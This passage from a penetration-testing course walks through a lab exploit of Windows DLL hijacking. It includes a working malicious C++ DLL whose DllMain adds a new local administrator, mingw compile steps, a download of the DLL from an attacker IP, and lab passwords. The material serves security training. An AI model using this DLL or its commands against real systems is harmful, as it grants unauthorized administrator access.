### Exploiting Windows Services through Dynamic Link Libraries (DLLs)

Dynamic Link Libraries (DLLs) provide essential functionality to programs and the Windows operating system. These libraries contain code or resources, such as icon files, that other executable files or objects can use. By leveraging DLLs, developers can integrate existing functionality without reinventing the wheel. Windows uses DLLs to store shared functionality, avoiding the redundancy of including the same code in multiple components. On Unix systems, these files are known as Shared Objects.

#### Methods to Exploit DLLs for Privilege Escalation

There are several methods to exploit how DLLs work on Windows, which can be effective for privilege escalation:

1. **Overwriting a DLL Used by a Service:**
   - Instead of overwriting the binary, we can overwrite a DLL used by the service. This method may cause the service to malfunction due to the missing DLL functionality. However, it often leads to code execution, allowing us to create a new local administrative user.

2. **Hijacking the DLL Search Order:**
   - The DLL search order is defined by Microsoft and determines the sequence in which directories are searched for DLLs. By default, all current Windows versions have safe DLL search mode enabled, making DLL hijacking more difficult.
   - The standard search order is:
     1. The directory from which the application loaded.
     2. The system directory.
     3. The 16-bit system directory.
     4. The Windows directory.
     5. The current directory.
     6. The directories listed in the PATH environment variable.

   When safe DLL search mode is disabled, the current directory is searched after the application’s directory.

3. **Exploiting Missing DLLs:**
   - If a binary attempts to load a non-existent DLL, the program may still run with restricted functionality. We can place a malicious DLL with the name of the missing DLL in a path of the DLL search order, causing it to execute when the binary starts.

#### Example: Abusing a Missing DLL

Let's demonstrate how to abuse a missing DLL using an example. Connect to `CLIENTWK220` with RDP as `steve` with the password `securityIsNotAnOption++++++`. Start PowerShell and enumerate the services:

```powershell
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name, State, PathName | Where-Object {$_.State -like 'Running'}
```

One of the running services is `BetaService`:

```plaintext
Name        State    PathName
----        -----    --------
...
BetaService Running  C:\Users\steve\Documents\BetaServ.exe
...
```

Check the permissions on the binary file of the service:

```powershell
PS C:\Users\steve> icacls .\Documents\BetaServ.exe
.\Documents\BetaServ.exe NT AUTHORITY\SYSTEM:(F)
BUILTIN\Administrators:(F)
CLIENTWK220\steve:(RX)
CLIENTWK220\offsec:(F)
Successfully processed 1 files; Failed processing 0 files
```

Since we only have Read and Execute permissions as `steve`, we need to investigate further.

#### Using Process Monitor to Identify DLLs

Use Process Monitor to display real-time information about process activities. Our goal is to identify all DLLs loaded by `BetaService` and detect any missing ones. Install and start Process Monitor as `backupadmin` with the password `admin123admin123!`.

Create a filter to show events related to `BetaServ.exe`:

1. Go to `Filter` > `Filter…`.
2. Set the filter conditions:
   - Column: `Process Name`
   - Relation: `is`
   - Value: `BetaServ.exe`
   - Action: `Include`
3. Click `Add`.

Restart the `BetaService` to observe the DLL loading process:

```powershell
PS C:\Users\steve> Restart-Service BetaService
WARNING: Waiting for service 'BetaService (BetaService)' to start...
```

Process Monitor will show numerous events, including `CreateFile` calls attempting to open `myDLL.dll` in various paths. The `Detail` column will indicate `NAME NOT FOUND` for these calls, meaning the DLL is missing.

The `PATH` environment variable confirms the search order:

```powershell
PS C:\Users\steve> $env:path
C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\steve\AppData\Local\Microsoft\WindowsApps;
```

#### Creating and Placing a Malicious DLL

To exploit this, we can create a malicious DLL named `myDLL.dll` and place it in the `Documents` folder of `steve`. The `DllMain` function in the DLL will be executed when the service loads the DLL.

Here is a basic C++ DLL example:

```cpp
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(
HANDLE hModule,
DWORD ul_reason_for_call,
LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        int i;
        i = system("net user dave2 password123! /add");
        i = system("net localgroup administrators dave2 /add");
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

Cross-compile the code with `mingw`:

```sh
kali@kali:~$ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

Transfer the DLL to `CLIENTWK220` and download it into the `Documents` folder:

```powershell
PS C:\Users\steve> cd Documents
PS C:\Users\steve\Documents> iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll
```

Restart the `BetaService` and confirm the creation of `dave2` as a local administrator:

```powershell
PS C:\Users\steve\Documents> Restart-Service BetaService
WARNING: Waiting for service 'BetaService (BetaService)' to start...

PS C:\Users\steve\Documents> net user
User accounts for \\CLIENTWK220
-------------------------------------------------------------------------------
Administrator BackupAdmin dave
dave2 daveadmin DefaultAccount
Guest offsec steve
WDAGUtilityAccount
The command completed successfully.

PS C:\Users\steve\Documents> net localgroup administrators
... 
Administrator
BackupAdmin
dave2
daveadmin
offsec
The command completed successfully.
```

#### Summary

By using Process Monitor, we identified that `BetaService` tried to load `myDLL.dll`. Since the service binary is located in the `Documents` folder of `steve`, we could write to this directory, which is the first in the DLL search order. This allowed our malicious DLL to be loaded and executed, creating a new local administrator account.

### Unquoted Service Paths

Another attack vector for privilege escalation involves unquoted service paths. This method is useful when we have Write permissions to a service’s main directory or subdirectories but cannot replace files within them. If the path of the service executable contains spaces and is not enclosed in quotes, it can be exploited for privilege escalation.

---

**References:**
- [Microsoft Documentation on Dynamic Link Libraries](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library)
- [Oracle Documentation on Shared Objects](https://docs.oracle.com/cd/E19120-01/open.solaris/819-0690/6n33n7f8u/index.html)
- [Microsoft Documentation on DLL Search Order](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [Microsoft Documentation on Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Microsoft Documentation on Restart-Service](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/restart-service?view=powershell-7.2)

**Copyright:**
- PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.
- Made in Morocco
- Penetration Testing with Kali Linux